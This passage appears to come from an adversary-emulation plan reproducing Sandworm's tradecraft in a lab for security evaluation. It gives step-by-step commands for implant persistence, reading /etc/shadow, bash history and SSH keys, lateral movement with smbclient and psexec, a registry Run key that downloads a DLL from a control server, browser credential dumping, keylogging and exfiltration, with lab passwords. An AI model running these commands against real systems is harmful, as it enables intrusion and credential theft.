+<pre class="language-none"><code v-pre class="language-none">Right click &gt; Split Horizontally</code></pre>
+</doc-codeblock></div>
+<p>In your lower terminal, enter the control server directory. Interaction with Exaramel-Linux (the implant) will occur through this terminal.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">cd ~/wizard_spider/Resources/control_server</code></pre>
+</doc-codeblock></div>
+<p>Set cron persistence.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Exaramel for Linux uses crontab for persistence if it does not have root privileges.
+
+./evalsC2client.py --set-task exaramel-implant &quot;persist cron&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel/configur/configur.go#L212">Source Code</a></p>
+<p>Set systemd persistence.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
+
+./evalsC2client.py --set-task exaramel-implant &quot;persist systemd&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel/configur/configur.go#L261">Source Code</a></p>
+<p>Get /etc/shadow.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Note: not in CTI but in TTP scope
+# OS Credential Dumping: /etc/passwd and /etc/shadow
+
+./evalsC2client.py --set-task exaramel-implant &quot;exec cat /etc/shadow&quot;</code></pre>
+</doc-codeblock></div>
+<p>Get bash history.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Note: not in CTI but in TTP scope
+# Unsecured Credentials: Bash History
+
+./evalsC2client.py --set-task exaramel-implant &quot;exec cat /home/fherbert/.bash_history&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel/worker/worker.go#L156">Source Code</a></p>
+<p>Download SSH keys from caladan to control server (HTTPS to 192.168.0.4:8443)</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Note: not in CTI but in TTP scope
+# Unsecured Credentials: Private Keys
+
+./evalsC2client.py --set-task exaramel-implant &quot;get /home/fherbert/.ssh/id_rsa caladan_id_rsa&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task exaramel-implant &quot;get /home/fherbert/.ssh/id_rsa.pub caladan_id_rsa.pub&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel/worker/worker.go#L100">Source Code</a></p>
+<p>Confirm SSH keys are present on attack platform:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ls -lsah files/</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf" class="outbound" target="_blank"><span>https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="test-8-steps-15-17">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-8-steps-15-17">#</doc-anchor-trigger>
+        <span>Test 8 (Steps 15-17)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-15---move-laterally-to-windows-host">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-15---move-laterally-to-windows-host">#</doc-anchor-trigger>
+        <span>Step 15 - Move laterally to Windows host</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>During this step, Sandworm uses credentials gained from step4 to move laterally to gammu/10.0.1.7 as local admin user fherbert.</p>
+<p>The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials.</p>
+<p>The Exaramel dropper is uploaded to <code v-pre>C:\\Windows\\wsmprovav.exe</code>.</p>
+<p>Sandworm then establishes a bind shell to gammu using PsExec.py from the Impacket framework.</p>
+<p>From the bind shell, Sandworm establishes registry persistance as user fherbert.</p>
+<p>Sandworm then disconnects from the bindshell.</p>
+<p>Notionally, the legitimate fherbert user logs in via RDP.</p>
+<p>This causes the registry persistence to execute the Exaramel dropper.</p>
+<p>The exaramel dropper downloads and executes an Exaramel DLL.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Compromised user info:
+
+User:	fherbert@WORKGROUP
+
+System: 10.0.1.7 / gammu
+
+PsExec Service: Windows Check AV
+
+File write: C:\\Windows\\wsmprovav.exe, C:\\Windows\\wsmprovav.dll
+
+Registry Path: HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run
+
+Key: SecurityHealth
+
+Value: C:\Windows\wsmprovav.exe http://192.168.0.4:8080/getFile/wsmprovav.dll C:\Windows\wsmprovav.dll
+
+Exaramel-Windows C2: 192.168.0.4:443 HTTPS
+</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> If you do not already have the Control Server from Step 13 running, execute the following. Otherwise, skip to the next <span class="docs-emoji">&#x26A0;&#xFE0F;</span>.</p>
+<p>Open a new terminal tab (ctrl+shift+t) and start the control server.</p>
+<p>Double click the terminal tab to change its name. Name your terminal tab &quot;control server&quot; for easy identification.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd wizard_spider/Resources/control_server &amp;&amp; sudo ./controlServer</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Go back to your first terminal tab (P.A.S. Webshell); re-name it &quot;PsExec-Gammu&quot;.</p>
+<p>Upload Exaramel-Windows-Dropper.exe to gammu/10.0.1.7 as <code v-pre>C:\Windows\wsmprovav.exe</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.
+
+# Sandworm Team have used previously acquired legitimate credentials prior to attacks.
+
+smbclient -U 'WORKGROUP\fherbert' //10.0.1.7/ADMIN$ -c &quot;put sandworm/Resources/Exaramel-Windows-Dropper/wsmprovav.exe wsmprovav.exe;&quot; &quot;Whg42WbhhCE17FEzrqeJ&quot;</code></pre>
+</doc-codeblock></div>
+<p>Use psexec.py to gain a bind-shell to gammu/10.0.1.7 over SMB (TCP 445):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm-associated malware including Olympic Destroyer, BlackEnergy, and notPetya use PsExec to interact with the ADMIN$ network share to execute commands on remote systems.
+
+# The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description &quot;Windows Check AV.&quot;
+
+/usr/share/doc/python-impacket/examples/psexec.py -service-name &quot;Windows Check AV&quot; WORKGROUP/fherbert@10.0.1.7</code></pre>
+</doc-codeblock></div>
+<p>Enter password:</p>
+<p><code v-pre>Whg42WbhhCE17FEzrqeJ</code></p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Observe the PsExec binary name, and paste it in the Slack chat for easy identification:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Your EXE name will differ
+
+[*] Uploading file enTHfBuw.exe</code></pre>
+</doc-codeblock></div>
+<p>Load the registry hive for user fherbert.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">reg.exe LOAD HKU\Temp &quot;C:\Users\fherbert\NTUSER.DAT&quot;</code></pre>
+</doc-codeblock></div>
+<p>Set registry persistence for user fherbert only.</p>
+<p>This will execute a Exaramel-Windows dropper on fherbert login.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm associated malware such as Exaramel-Windows and Olympic Destroyer have modified the registry.
+
+# Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">reg.exe ADD HKU\Temp\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d &quot;C:\Windows\wsmprovav.exe http://192.168.0.4:8080/getFile/wsmprovav.dll C:\Windows\wsmprovav.dll&quot;</code></pre>
+</doc-codeblock></div>
+<p>Terminate the PsExec.py session. Keep your terminal open.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">exit</code></pre>
+</doc-codeblock></div>
+<p>You will now RDP into gammu, role-playing as the legitimate fherbert user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">xfreerdp +clipboard /u:WORKGROUP\\fherbert /p:&quot;Whg42WbhhCE17FEzrqeJ&quot; /v:10.0.1.7</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Keep the gammu-RDP window open.</p>
+<p>On login, the fherbert registry persistence will execute the exaramel-windows-dropper (wsmprovav.exe).</p>
+<p>The dropper will download Exaramel-Windows over HTTP. The dropper then executes the Exaramel-Windows (wsmprovav.dll) using rundll32.exe.</p>
+<p><a href="../../resources/exaramel-windows-dropper/main.cpp">Source Code</a></p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.</p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html" class="outbound" target="_blank"><span>https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/" class="outbound" target="_blank"><span>https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://blog.talosintelligence.com/2018/02/olympic-destroyer.html" class="outbound" target="_blank"><span>https://blog.talosintelligence.com/2018/02/olympic-destroyer.html</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-16---windows-discovery">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-16---windows-discovery">#</doc-anchor-trigger>
+        <span>Step 16 - Windows Discovery</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>Using the Exaramel-Windows C2 channel, Sandworm obtains the current username, OS version, performs a recursive file listing, and queries for RDP connections.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Place your cursor on the second pane in the control server window.</p>
+<p>Run the following discovery commands:</p>
+<p>Get current user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has collected the username from a compromised host.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;get-user&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L36">Source Code</a></p>
+<p>Get Windows version info.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team used a backdoor to enumerate information about the infected system's operating system.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;get-sysinfo&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L46">Source Code</a></p>
+<p>List entire file system.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has enumerated files on a compromised host.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;enum-files C:\\&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L55">Source Code</a></p>
+<p>Look for RDP connections.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd netstat -ano | findstr 3389&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L17">Source Code</a></p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://www.justice.gov/opa/press-release/file/1328521/download" class="outbound" target="_blank"><span>https://www.justice.gov/opa/press-release/file/1328521/download</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+<li><p><a href="https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/" class="outbound" target="_blank"><span>https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></p>
+</li>
+</ul>
+<br>
+<doc-anchor-target id="step-17---credential-dumping">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-17---credential-dumping">#</doc-anchor-trigger>
+        <span>Step 17 - Credential Dumping</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>voice track</code></p>
+<p>During this step, Sandworm collects credentials.</p>
+<p>Sandworm first uploads two files to disk:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">1. C:\Windows\System32\oradump.exe
+2. C:\Windows\System32\mslog.exe</code></pre>
+</doc-codeblock></div>
+<p>oradump.exe is a variant of the open source tool, LaZagne. It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.</p>
+<p>mslog.exe is a keylogger that uses the SetWindowsHookEx function; mslog.exe writes a keystroke log file to C:\Windows\System32\mslog.txt.</p>
+<p>Sandworm obtains web browser credentials via oradump.exe.</p>
+<p>Sandworm obtains domain admin credentials by keylogging an RDP session from a valid user.</p>
+<p>Sandworm then gets a list of all domain hosts using dsquery.</p>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 192.168.0.4:443):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task Exaramel-Windows &quot;get-file https://192.168.0.4/getFile/dumpWebBrowserCreds.exe C:\\Windows\\System32\\oradump.exe&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute the webCredDumper; you should see credentials from Chromium.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd C:\\Windows\\System32\\oradump.exe&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/browser-creds/windows">Modified LaZagne</a></p>
+<p>Upload keylogger to gammu.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task Exaramel-Windows &quot;get-file https://192.168.0.4/getFile/keylogger.exe C:\\Windows\\System32\\mslog.exe&quot;</code></pre>
+</doc-codeblock></div>
+<p>Execute the keylogger, logging keystrokes to mslog.txt.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;exec-background C:\\Windows\\System32\\mslog.exe -o C:\\Windows\\System32\\mslog.txt&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/keylogger/src/setwindowshookex-keylogger.cpp">Keylogger Source Code</a></p>
+<p>Now we will exercise the keylogger.</p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Switch to the gammu-RDP-session window.</p>
+<p>Open the Windows RDP client on Gammu and <em>manually</em> type the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">IP Address:  10.0.1.4
+Username:    patreides
+Password:    ebqMB7DmM81QVUqpf7XI</code></pre>
+</doc-codeblock></div>
+<p>You must type this data manually to exercise the keylogger (caveat: if you fail to enter the password on the first try, just copy/paste it).</p>
+<p>Give arrakis a minute to load, then right-click sign-out from the RDP session.</p>
+<p>Keep the gammu RDP session open.</p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Go back to your control server terminal.</p>
+<p>Confirm the keylogger log file exists:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd dir C:\\Windows\\System32\\mslog.txt&quot;</code></pre>
+</doc-codeblock></div>
+<p>Confirm the keylogger actually logged keystrokes:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd type C:\\Windows\\System32\\mslog.txt&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L17">Source Code</a></p>
+<p>Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).</p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Exaramel-Windows automatically RC4 encrypts the keylog file before exfiltration.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Exaramel for Windows automatically encrypts files before sending them to the C2 server.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;put-file C:\\Windows\\System32\\mslog.txt&quot;</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/exaramel-windows/taskhandler/taskhandler.go#L94">Source Code</a></p>
+<p>Confirm you uploaded the keylog file; you should see an RC4 encrypted blob.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">cat files/mslog.txt</code></pre>
+</doc-codeblock></div>
+<p>Terminate the keylogger</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd taskkill /F /IM mslog.exe&quot;</code></pre>
+</doc-codeblock></div>
+<p>Enumerate all domain hosts (prep for notpetya deployment)</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd dsquery.exe computer -s 10.0.1.4 -u patreides -p ebqMB7DmM81QVUqpf7XI&quot;</code></pre>
+</doc-codeblock></div>
+<p>Cleanup artifacts.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Sandworm Team has used backdoors that can delete files used in an attack from an infected system.
+
+./evalsC2client.py --set-task Exaramel-Windows &quot;exec-cmd del /Q C:\\Windows\\System32\oradump.exe C:\\Windows\\System32\\mslog.exe C:\\Windows\\System32\\mslog.txt&quot;</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Go back to the gammu RDP session; right-click sign-out.</p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
